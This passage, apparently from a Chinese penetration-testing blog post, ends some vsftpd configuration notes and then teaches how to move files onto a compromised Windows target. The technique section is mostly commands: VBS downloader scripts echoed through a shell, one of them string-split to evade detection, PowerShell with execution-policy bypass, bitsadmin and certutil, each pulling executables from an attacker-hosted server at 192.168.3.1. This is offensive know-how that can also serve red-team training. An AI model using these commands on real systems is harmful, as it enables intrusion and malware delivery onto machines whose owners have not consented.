</span></span><span style="display:flex;"><span><span style="color:#58a1dd">tcp_wrappers</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span><span style="color:#828b96;font-style:italic">#启用TCP包过滤器，可以使用TCP Wrappers来限制对FTP服务器的访问。可以使用类似于hosts.allow和hosts.deny的配置文件来控制访问权限。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">use_localtime</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">YES</span><span style="color:#828b96;font-style:italic">#使用本地时间作为FTP服务器的默认时间设置。这意味着服务器将使用操作系统的本地时间设置。</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">reverse_lookup_enable</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">NO</span><span style="color:#828b96;font-style:italic">#禁用反向DNS查找功能。禁用此功能可以提高FTP服务器的性能，但可能会导致某些客户端无法正确解析服务器的主机名。</span></span></span></code></pre></div><h3 id="连接" class="heading-element"><span>连接</span>
  <a href="#%e8%bf%9e%e6%8e%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在vsftpd服务程序的匿名开放认证模式下，其账户统一为anonymous，密码为空。而且在连接到FTP服务器后，默认访问的是/var/ftp目录</p>
<p>在采用本地用户模式登录FTP服务器后，默认访问的是该用户的家目录</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301837574.webp" alt="image-20230930183741453" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301837574.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301837574.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301837574.webp?size=large 2x" data-title="image-20230930183741453" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h1 id="vbs" class="heading-element"><span>VBS</span>
  <a href="#vbs" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><blockquote>
<p>VBS是windows中基于Visual Basic的脚本语言。</p>
<p>利用VBS上传，主要使用的是msxm12.xmlhttp和adodb.stream对象。</p>
</blockquote>
<h2 id="方法一" class="heading-element"><span>方法一</span>
  <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>首先在本地开启http服务，提供文件下载：</p>
<p>通过shell向靶机写入VBS代码：</p>
<pre tabindex="0"><code class="language-visual" data-lang="visual">echo Set Post = CreateObject(&#34;Msxml2.XMLHTTP&#34;) &gt;&gt;download.vbs
echo Set Shell = CreateObject(&#34;Wscript.Shell&#34;) &gt;&gt;download.vbs
echo Post.Open &#34;GET&#34;,&#34;http://192.168.3.1/target.exe&#34;,0 &gt;&gt;download.vbs
echo Post.Send() &gt;&gt;download.vbs
echo Set aGet = CreateObject(&#34;ADODB.Stream&#34;) &gt;&gt;download.vbs
echo aGet.Mode = 3 &gt;&gt;download.vbs
echo aGet.Type = 1 &gt;&gt;download.vbs
echo aGet.Open() &gt;&gt;download.vbs
echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs
echo aGet.SaveToFile &#34; C:/Users/Monster/Desktop/target.exe&#34;,2 &gt;&gt;download.vbs</code></pre><p>此处靶机中会生成download.vbs，执行：</p>
<pre tabindex="0"><code>Cscript download.vbs</code></pre><p>成功上传文件至靶机。</p>
<h2 id="方法二" class="heading-element"><span>方法二</span>
  <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>VBS一句话下载</p>
<pre tabindex="0"><code class="language-visual" data-lang="visual">echo set a=createobject(^&#34;adod^&#34;+^&#34;b.stream^&#34;):set w=createobject(^&#34;micro^&#34;+^&#34;soft.xmlhttp^&#34;):w.open^&#34;get^&#34;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt; downfile.vbs 
cscript downfile.vbs http://192.168.3.1/target.exe C:/Users/Monster/Desktop/target2.exe</code></pre><blockquote>
<p>这段提供的代码是一个 VBScript 代码片段，用于从指定的 URL 下载文件并将其保存到本地目标位置。以下是代码的解释：</p>
<ol>
<li>第一行创建了一个 ADODB.Stream 对象，用于处理二进制数据流。</li>
<li>第二行创建了一个 Microsoft.XMLHTTP 对象，用于进行 HTTP 请求。</li>
<li>第三行使用 <code>open</code> 方法初始化 HTTP 请求，参数为 <code>GET</code> 方法和 <code>wsh.arguments(0)</code>，即从脚本的命令行参数中获取要下载的文件的 URL。</li>
<li>第四行使用 <code>send</code> 方法发送 HTTP 请求。</li>
<li>第五行将 <code>type</code> 属性设置为 1，表示将 <code>a</code> 对象视为二进制数据。</li>
<li>第六行使用 <code>open</code> 方法初始化 ADODB.Stream 对象。</li>
<li>第七行使用 <code>write</code> 方法将 HTTP 响应的主体内容写入 ADODB.Stream 对象。</li>
<li>第八行使用 <code>savetofile</code> 方法将 ADODB.Stream 对象保存到本地文件系统中，保存路径为 <code>wsh.arguments(1)</code>，即从脚本的命令行参数中获取的本地目标文件名。</li>
</ol>
</blockquote>
<h1 id="powershell" class="heading-element"><span>powershell</span>
  <a href="#powershell" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">powershell</span> <span style="color:#58a1dd">-exec</span> <span style="color:#58a1dd">bypass</span> <span style="color:#58a1dd">-c</span> (<span style="color:#58a1dd">New-Object</span> <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">Net</span>.<span style="color:#58a1dd">WebClient</span>).<span style="color:#58a1dd">DownloadFile</span>(<span style="color:#a6be9d">&#39;http://192.168.3.1/hash.exe&#39;</span>,<span style="color:#a6be9d">&#39;C:/Users/Monster/Desktop/hash.exe&#39;</span>);</span></span></code></pre></div><h1 id="bitsadmin" class="heading-element"><span>bitsadmin</span>
  <a href="#bitsadmin" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>除了脚本以外，windows还有自带的两个工具：bitsadmin和certutil。</p>
<p>Bitsadmin是一个<a href="https://cloud.tencent.com/product/cli?from_column=20065&amp;from=20065"target="_blank" rel="external nofollow noopener noreferrer">命令行工具</a>，Windows xp以后的版本中自带该工具，例如Windows Update程序就依靠它来下载文件，因此我们也可以进行利用。</p>
<pre tabindex="0"><code>bitsadmin /transfer 123 http://192.168.3.1/hello.txt C:\Users\Monster\Desktop\hello.txt</code></pre><p>//123为任务号</p>
<p>注：经测试这种方法进行下载比其他方法慢很多。</p>
<p>保存路径不能写成C:/Users/Monster/Desktop/hello.txt，否则会报错：</p>
<h1 id="certutil" class="heading-element"><span>certutil</span>
  <a href="#certutil" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Windows有一个名为CertUtil的内置程序，可用于在Windows中管理证书，CertUtil的一个特性是能够从远程URL下载证书或任何其他文件。</p>
<pre tabindex="0"><code>certutil -urlcache -split -f http://192.168.3.1/hash.exe</code></pre><p>但是这种下载方法默认会留下缓存，下载完成后通过delete参数清除缓存</p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag" title="Tags - 内网渗透">内网渗透</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/60/" class="post-nav-item" rel="prev" title="Windows内网信息搜集"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Windows内网信息搜集</a>
      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/56/" class="post-nav-item" rel="next" title="Windows Hash抓取">Windows Hash抓取<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
<a href="https://statcounter.com/p13160752/?guest=1" target="_blank">访问量统计</a> 

<script type="text/javascript">
var sc_project=13160752;
var sc_invisible=0;
var sc_security="211d0342";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost +
"statcounter.com/counter/counter.js'></"+"script>");
</script>

<noscript>
  <div class="statcounter">
    <a title="web stats" href="https://statcounter.com/" target="_blank">
      <img referrerPolicy="no-referrer-when-downgrade">
    </a>
  </div>
</noscript>


    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
